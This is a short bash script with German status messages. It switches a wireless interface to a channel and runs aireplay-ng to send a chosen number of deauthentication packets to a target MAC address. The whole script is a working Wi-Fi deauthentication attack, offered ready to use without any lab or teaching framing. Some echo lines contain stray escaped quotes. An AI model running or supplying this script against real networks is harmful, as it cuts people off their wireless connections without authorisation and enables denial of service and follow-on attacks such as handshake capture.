#!/bin/bash

set -x

INTERFACE="$1"
TARGET_MAC="$2"
PACKETS="$3"
CHANNEL="$4"

if [ -z "$INTERFACE" ] || [ -z "$TARGET_MAC" ]; then
  echo "❌ Interface oder MAC-Adresse fehlen"
  exit 1
fi

if [ -z "$PACKETS" ]; then
  PACKETS=100
fi

if [ -z "$CHANNEL" ]; then
  echo \"⚠️  Kein Kanal angegeben. Standardwert 6 wird verwendet.\"
  CHANNEL=6
fi

echo \"🔁 Setze Kanal $CHANNEL für Interface $INTERFACE\"
iwconfig \"$INTERFACE\" channel $CHANNEL
sleep 1

echo \"🚀 Sende $PACKETS Deauth-Pakete an $TARGET_MAC über $INTERFACE\"
aireplay-ng --deauth $PACKETS -a \"$TARGET_MAC\" \"$INTERFACE\"
